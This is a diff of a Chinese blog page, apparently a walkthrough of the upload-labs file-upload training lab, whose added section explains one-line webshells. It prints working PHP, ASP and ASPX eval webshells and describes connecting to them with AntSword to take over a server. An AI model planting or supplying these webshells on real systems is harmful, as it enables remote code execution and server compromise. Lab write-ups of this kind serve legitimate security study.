@@ -24,7 +24,7 @@
 <meta property="og:image" content="http://example.com/.com//8.png">
 <meta property="og:image" content="http://example.com/.com//9.png">
 <meta property="article:published_time" content="2021-02-09T11:32:20.000Z">
-<meta property="article:modified_time" content="2021-02-20T04:26:28.645Z">
+<meta property="article:modified_time" content="2021-02-24T04:51:36.883Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="upload-labs">
 <meta name="twitter:card" content="summary">
@@ -108,7 +108,24 @@
 </ul>
 <p><img src="/.com//1.png" alt="1"></p>
 <ul>
-<li>判断上传漏洞类型的思路：<img src="/.com//2.png" alt="2" style="zoom: 200%;"></li>
+<li><p>判断上传漏洞类型的思路：<img src="/.com//2.png" alt="2" style="zoom: 200%;"></p>
+</li>
+<li><p><strong>webshell（一句话木马）的制备</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模板： <span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;password&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>@</code>表示后面即使执行错误，也不报错。<code>eval（）</code>函数表示括号内的语句字符串什么的全都当做代码执行。<code>$_POST[&#39;password&#39;]</code>表示从页面中用post的方式获得password这个参数值。</p>
+</li>
+</ul>
+<p>那么这句话的作用是什么呢？举个例子：password=echo ‘a’，就相当于&lt; ?php @eval(“echo ‘a’”);? &gt;即再网页上输出一个a。我们知道了这个就可以根据改变password的值来达到操控服务器的目的了，或者我们可以连接蚁剑，一键获取目标服务器。</p>
+<p><strong>补充：</strong></p>
+<ul>
+<li><strong>入侵的条件</strong></li>
+</ul>
+<p>（1）木马上传成功，未被杀；<br>（2）知道木马的路径在哪；<br>（3）上传的木马能正常运行。</p>
+<ul>
+<li><p><strong>常见的一句话木马</strong></p>
+<p>php的一句话木马： &lt; ?php @eval($_POST[‘pass’]);? &gt;<br>asp的一句话是：   &lt;%eval request (“pass”)%&gt;<br>aspx的一句话是：  &lt;%@ Page Language=”Jscript”%&gt; &lt;%eval(Request.Item[“pass”],”unsafe”);%&gt;</p>
+</li>
 </ul>
 <h1 id="pass-01：js检查"><a href="#pass-01：js检查" class="headerlink" title="pass-01：js检查"></a>pass-01：js检查</h1><p>打开pass-01的index.php查看源码，我们看到网页对上传的图片做了js检查，</p>
 <p><img src="/.com//3.png" alt="3"></p>
@@ -307,7 +324,7 @@
 <ul>
 <li>那么我们这关的思路是：先webshell.php，抓包，后缀后添加::DATA，最后蚁剑连接。</li>
 </ul>
-<h1 id="pass-10："><a href="#pass-10：" class="headerlink" title="pass-10："></a>pass-10：</h1><ul>
+<h1 id="pass-10"><a href="#pass-10" class="headerlink" title="pass-10"></a>pass-10</h1><ul>
 <li>这关查看源码发现过滤的都过滤了，但是和以往有一点不同：上传位置表达方式改变</li>
 </ul>
 <p>旧：$img_path = UPLOAD_PATH.’/‘.date(“YmdHis”).rand(1000,9999).$file_ext;</p>
@@ -405,7 +422,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 16.67px;">C语言学习</a> <a href="/tags/HPPT/" style="font-size: 10px;">HPPT</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 10px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 13.33px;">web渗透</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
+      <a href="/tags/C%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" style="font-size: 16.67px;">C语言学习</a> <a href="/tags/HPPT/" style="font-size: 10px;">HPPT</a> <a href="/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/" style="font-size: 10px;">MySQL数据库的搭建与启动</a> <a href="/tags/PHP/" style="font-size: 10px;">PHP</a> <a href="/tags/mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/" style="font-size: 10px;">mysql数据库的使用</a> <a href="/tags/sqlilabs/" style="font-size: 20px;">sqlilabs</a> <a href="/tags/upload-labs/" style="font-size: 13.33px;">upload-labs</a> <a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 13.33px;">web渗透</a> <a href="/tags/%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9%E6%9F%A5/" style="font-size: 10px;">数据库的增删改查</a>
     </div>
   </div>
 
@@ -427,7 +444,11 @@
       <ul>
         
           <li>
-            <a href="/2021/02/20/upload-labs-pass14/">upload-labs-pass14</a>
+            <a href="/2021/02/25/dvwa-1/">dvwa</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/20/upload-labs-pass14-21/">upload-labs-pass14-21</a>
           </li>
         
           <li>
@@ -440,10 +461,6 @@
         
           <li>
             <a href="/2021/02/08/lesson54-65/">lesson54-65</a>
-          </li>
-        
-          <li>
-            <a href="/2021/02/07/lesson46-53/">lesson46-53</a>
           </li>
         
       </ul>
